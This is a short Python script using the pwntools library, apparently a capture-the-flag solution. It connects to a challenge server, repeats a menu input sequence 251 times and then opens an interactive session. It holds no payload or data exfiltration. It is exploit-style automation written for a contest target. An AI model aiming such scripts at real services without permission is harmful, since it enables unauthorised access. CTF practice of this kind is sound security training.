from pwn import *

r = remote("chals20.cybercastors.com", 14432)
r.clean()
r.sendline("6")
print(r.clean())
for x in range(251):
    print(x)
    r.sendline("0")
    print(r.recvline())
    r.clean()
    r.sendline("1")
    print(r.recvline())
    r.clean()

r.sendline("5")
r.interactive()
